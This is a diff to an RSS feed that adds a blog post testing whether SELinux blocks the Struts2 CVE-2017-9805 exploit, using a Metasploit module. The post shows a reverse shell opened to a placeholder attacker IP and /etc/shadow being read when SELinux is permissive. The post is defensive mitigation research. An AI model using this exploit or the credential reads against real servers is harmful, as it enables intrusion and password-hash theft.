@@ -7,8 +7,141 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>ja-JP</language>
     <copyright>SOSS SIG all rights reserved. 2016</copyright>
-    <lastBuildDate>Wed, 09 Aug 2017 16:48:48 +0900</lastBuildDate>
+    <lastBuildDate>Mon, 11 Sep 2017 15:59:59 +0900</lastBuildDate>
     <atom:link href="https://jsoss-sig.github.io/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>S2-052: CVE-2017-9805(Struts2) PoC with SELinux</title>
+      <link>https://jsoss-sig.github.io/post/omok-selinux-struts2-20170911/</link>
+      <pubDate>Mon, 11 Sep 2017 15:59:59 +0900</pubDate>
+      
+      <guid>https://jsoss-sig.github.io/post/omok-selinux-struts2-20170911/</guid>
+      <description>
+
+&lt;p&gt;We did recently &amp;ldquo;Important&amp;rdquo; Struts2 vulnerability(CVE-2017-9805) PoC to check how SELinux can mitigate that vulnerability.&lt;/p&gt;
+
+&lt;p&gt;(Written by Kazuki Omo:ka-omo@sios.com).&lt;/p&gt;
+
+&lt;h2 id=&#34;prepare-for-poc&#34;&gt;Prepare for PoC&lt;/h2&gt;
+
+&lt;p&gt;Here is a description how to reproduce it. &lt;strong&gt;I used CentOS7 image for the PoC.
+I used VMWare Guest(CPU: 1, Memory: 2GB) for the PoC.&lt;/strong&gt;
+Also, I used selinux-policy-targeted-3.13.1-145.el7.noarch (See related post: &lt;a href=&#34;http://www.secureoss.jp/post/omok-selinux-struts2-20170607/&#34;&gt;http://www.secureoss.jp/post/omok-selinux-struts2-20170607/&lt;/a&gt;).&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;Install tomcat and related packages for working Struts2.&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Download and install vulnerable version of Struts2. I used struts-2.5.11. Copy struts2-showcase.war and struts2-rest-showcase.war under /var/lib/tomcat/webapps&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@centos7:~# ls /var/ls /var/lib/tomcat/webapps/*war
+/var/lib/tomcat/webapps/struts2-showcase.war
+/var/lib/tomcat/webapps/struts2-rest-showcase.war
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Prepare Metasploit for the PoC. You can easy to use &amp;ldquo;Kali Linux(&lt;a href=&#34;https://www.kali.org/downloads/)&amp;quot;&#34;&gt;https://www.kali.org/downloads/)&amp;quot;&lt;/a&gt; for running Metasploit Framework. Run &amp;ldquo;apt-get update ; apt-get upgrade&amp;rdquo; for updating Kali Linux completely, then follow the procedure for running CVE-2017-9805 PoC (Set up Metasploit Module for Apache Struts2 Rest : &lt;a href=&#34;http://hackersgrid.com/2017/09/metasploit-module-for-apache-struts-2-rest-cve-2017-9805.html&#34;&gt;http://hackersgrid.com/2017/09/metasploit-module-for-apache-struts-2-rest-cve-2017-9805.html&lt;/a&gt;).&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;To avoid normal Unix permission check for the PoC, I changed /etc/shadow permission to 755.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@centos7:~# ls -lZ /etc/shadow
+-rw-r--r--. root root system_u:object_r:shadow_t:s0        /etc/shadow
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&#34;poc-with-no-selinux-selinux-permissive&#34;&gt;PoC with no SELinux(SELinux Permissive)&lt;/h2&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;Confirm SELinux is Permissive mode;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@centos7:~# getenforce
+Permissive
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Run PoC from msfconsole(Metasploit). AA.AA.AA.AA is Kali Linux IP, and XX.XX.X.XX is Struts2 PoC server;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt; msf exploit(struts2_rest_xstream) &amp;gt; exploit
+
+ [*] Started reverse TCP double handler on AA.AA.AA.AA:4444 
+ [*] Accepted the first client connection...
+ [*] Accepted the second client connection...
+ [*] Command: echo DxP98C50UAVxX6jn;
+ [*] Writing to socket A
+ [*] Writing to socket B
+ [*] Reading from sockets...
+ [*] Reading from socket B
+ [*] B: &amp;quot;DxP98C50UAVxX6jn\r\n&amp;quot;
+ [*] Matching...
+ [*] A is input...
+ [*] Command shell session 2 opened (AA.AA.AA.AA:4444 -&amp;gt; XX.XX.XX.XX:43584) at 2017-09-11 15:49:01 +0900
+
+ id
+ uid=91(tomcat) gid=91(tomcat) groups=91(tomcat) context=system_u:system_r:tomcat_t:s0
+
+ root:XXXXXX.::0:99999:7:::
+ bin:*:17110:0:99999:7:::
+ daemon:*:17110:0:99999:7:::
+ --snip--
+ sshd:!!:17247::::::
+ jssosug:XXXXXXXXXXXX::0:99999:7:::
+
+ jsossug@vmhost:~$
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&#34;poc-with-selinux-enabled-selinux-enforcing&#34;&gt;PoC with SELinux Enabled(SELinux Enforcing)&lt;/h2&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;Reboot and set SELinux as Enforcing.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;root@centos7:~# getenforce
+Permissive
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;Run PoC from msfconsole(Metasploit). AA.AA.AA.AA is Kali Linux IP, and XX.XX.X.XX is Struts2 PoC server;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt; msf exploit(struts2_rest_xstream) &amp;gt; exploit
+
+ [*] Started reverse TCP double handler on AA.AA.AA.AA:4444 
+ [*] Accepted the first client connection...
+ [*] Accepted the second client connection...
+ [*] Command: echo DxP98C50UAVxX6jn;
+ [*] Writing to socket A
+ [*] Writing to socket B
+ [*] Reading from sockets...
+ [*] Reading from socket B
+ [*] B: &amp;quot;DxP98C50UAVxX6jn\r\n&amp;quot;
+ [*] Matching...
+ [*] A is input...
+ [*] Command shell session 2 opened (AA.AA.AA.AA:4444 -&amp;gt; XX.XX.XX.XX:43584) at 2017-09-11 15:49:01 +0900
+
+ id 
+ uid=91(tomcat) gid=91(tomcat) groups=91(tomcat) context=system_u:system_r:tomcat_t:s0
+
+ cat /etc/shadow
+ cat: /etc/shadow: Permission denied
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;Check AVC log on Struts PC;&lt;/p&gt;
+
+&lt;p&gt;type=AVC msg=audit(1505112552.257:431): avc:  denied  { read } for  pid=4684 comm=&amp;ldquo;cat&amp;rdquo; name=&amp;ldquo;shadow&amp;rdquo; dev=&amp;ldquo;dm-1&amp;rdquo; ino=34690693 scontext=system_u:system_r:tomcat_t:s0 tcontext=system_u:object_r:shadow_t:s0 tclass=file&lt;/p&gt;&lt;/li&gt;
+&lt;/ol&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;From this PoC we can say&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;Latest SELinux can mitigate Struts2 vulnerability &amp;ldquo;if Policy is updated&amp;rdquo;.&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+    </item>
     
     <item>
       <title>S2-048: CVE-2017-9791(Struts2) PoC with SELinux</title>
